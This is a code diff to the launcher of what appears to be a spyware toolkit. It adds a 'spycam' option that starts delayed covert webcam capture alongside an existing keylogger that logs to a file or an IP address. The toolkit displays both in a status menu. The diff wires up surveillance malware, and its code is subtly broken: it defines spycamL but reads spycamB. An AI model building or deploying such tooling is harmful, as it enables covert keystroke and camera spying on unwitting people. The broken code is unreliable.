@@ -7,9 +7,12 @@ import re
 from util import *
 
 from keylogger import Keylogger
+from spycam import takeAPicture
 
 #----------- actif  form   val
 keyloggerL = [None, None]
+#----------- actif  form   val
+spycamL = [False, None]
 
 print("\n"+(" "*6)+Colors.GREEN+"╋╋╋╋┏┓┏┓╋╋╋╋╋╋╋╋┏━┓")
 print((" "*6)+"┏━┳┳┫┗┫┗┳━┳━┳┳━━┫━╋━┳┳┳┳┳┳━┓┏┳┳━┓")
@@ -32,6 +35,7 @@ if ('keylogger' in sys.argv):
 	keyloggerL[0] = True
 	try :
 		if (sys.argv[index+1] != '--file' and sys.argv[index+1] != '--ip'):
+			print(Errors.BADUSAGEKEYLOG)
 			exit(1)
 	except Exception as ex :
 		print(Errors.BADUSAGEKEYLOG)
@@ -52,13 +56,36 @@ if ('keylogger' in sys.argv):
 				exit(1)
 			else :
 				keyloggerL[1] = "write at './"+sys.argv[index+2]+"'"
-				key = Keylogger()
+				key = Keylogger(sys.argv[index+2])
 				key.start()
 
 	except Exception as ex :
 		print(Errors.NOIP)
 		exit(1)
 
+
+if ('spycam' in sys.argv):
+	index = (sys.argv.index('spycam'))
+	try :
+		if (sys.argv[index+1] != '--delay'):
+			print(Errors.BADUSAGESPYCAM)
+			exit(1)
+	except Exception as ex :
+		print(Errors.BADUSAGESPYCAM)
+		exit(1)
+	try :
+		if (sys.argv[index+1] == '--delay'):
+			if (re.search("[1234567890]+", sys.argv[index+2]) == None):
+				print(Errors.BADDELAY)
+				exit(1)
+			else :
+				mySpycam = takeAPicture(int(sys.argv[index+2]))
+				mySpycam.start()
+				spycamB = [True, sys.argv[index+2]]
+
+	except Exception as ex :
+		print(Errors.NODELAY)
+		exit(1)
 
 print(" ┌─────────────┬─────────────────────────┐")
 print(" │  "+Colors.UNDERLINE+"Functions"+Colors.ENDC+"  │           infos         │")
@@ -71,9 +98,15 @@ else :
 	print(" ├─────────────┤ "+keyloggerL[1])
 	print(" │             │                         │")
 	print(" ├─────────────┼─────────────────────────┤")
+if (spycamB[0]==False):
+	print(" │  "+Colors.OKGREEN+"  Spycam "+Colors.ENDC+"  │         Inactive        │")
+	print(" ├─────────────┼─────────────────────────┤")
+else :
+	print(" │  "+Colors.OKGREEN+"  Spycam "+Colors.ENDC+"  │          Active         │")
+	print(" │             │        Delay = "+spycamB[1])
+	print(" ├─────────────┼─────────────────────────┤")
 print(" │   "+Colors.OKGREEN+"Other"+Colors.ENDC+"     │         inactive        │")
 print(" ├─────────────┤                         │")
 print(" │             │                         │")
 print(" │             │                         │")
 print(" └─────────────┴─────────────────────────┘")
-
